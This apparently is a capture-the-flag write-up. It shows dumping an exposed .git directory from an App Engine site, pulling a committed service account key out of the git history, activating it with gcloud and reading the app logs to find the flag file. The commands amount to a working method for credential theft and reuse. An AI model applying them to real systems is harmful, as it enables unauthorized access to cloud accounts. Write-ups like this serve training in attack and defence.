
url is https://booming-cosine-304921.wl.r.appspot.com/

robots.txt has:
```
User-agent: * 
Disallow: /.git/*
```

using gitdumper.sh <https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh>

output to folder and go to folder

output from:
```git log``` 

show 2 commits:

```
$ git log
commit 8170c6c35cccffe0f9e2715fd7b81c832e5d9fd1 (HEAD -> master)
Author: corgi <corgi@corgiwoofwoof.com>
Date:   Fri Mar 5 19:55:42 2021 -0800

    clean up complete

commit 543e9d358dbd4276da5277291624d16fb8b9d56a
Author: corgi <corgi@corgiwoofwoof.com>
Date:   Fri Mar 5 19:55:00 2021 -0800

    remove this later
```

first one is potentially sensitive:

```
$ git show 543e9d358dbd4276da5277291624d16fb8b9d56a
commit 543e9d358dbd4276da5277291624d16fb8b9d56a
Author: corgi <corgi@corgiwoofwoof.com>
Date:   Fri Mar 5 19:55:00 2021 -0800

    remove this later

diff --git a/booming-cosine-304921-5327fdaff786.json b/booming-cosine-304921-5327fdaff786.json
new file mode 100644
index 0000000..a440f42
--- /dev/null
+++ b/booming-cosine-304921-5327fdaff786.json
@@ -0,0 +1,12 @@
+{
+  "type": "service_account",
+  "project_id": "booming-cosine-304921",
+  "private_key_id": "5327fdaff786b034f9dc37834326fd83dfa1d972",
+  "private_key": "<REDACTED>",
+  "client_email": "shout-into-void-sa@booming-cosine-304921.iam.gserviceaccount.com",
+  "client_id": "107706400735285344688",
+  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
+  "token_uri": "https://oauth2.googleapis.com/token",
+  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
+  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/shout-into-void-sa%40booming-cosine-304921.iam.gserviceaccount.com"
+}
```

get information and save it as .json file (```/shout-void.json```)

.json file is used for auth as a serviceaccount in gcloud <https://cloud.google.com/sdk/gcloud/reference/auth/activate-service-account>

using docker image for gcloud CLI to avoid installing stuff

```
docker run -it --entrypoint=/bin/bash -v $PWD/shout-void.json:/tmp/auth.json gcr.io/google.com/cloudsdktool/cloud-sdk:latest
```

inside the container:
```
gcloud auth activate-service-account --key-file=/tmp/auth.json
gcloud auth list
gcloud config set account shout-into-void-sa@booming-cosine-304921.iam.gserviceaccount.com
gcloud config set project booming-cosine-304921
```

getting logs from the app
```
gcloud app logs read
```

some requests showing potential flag file path:

```
2021-03-09 21:56:00 default[20210306t171812]  "GET /send?message=https%3A%2F%2Fstorage.googleapis.com%2Fshout-into-void%2F1574AB2CB00533975094D87814BCF8FA707FD608-flag.txt HTTP/1.1" 200
```

flag is in ```https://storage.googleapis.com/shout-into-void/1574AB2CB00533975094D87814BCF8FA707FD608-flag.txt```
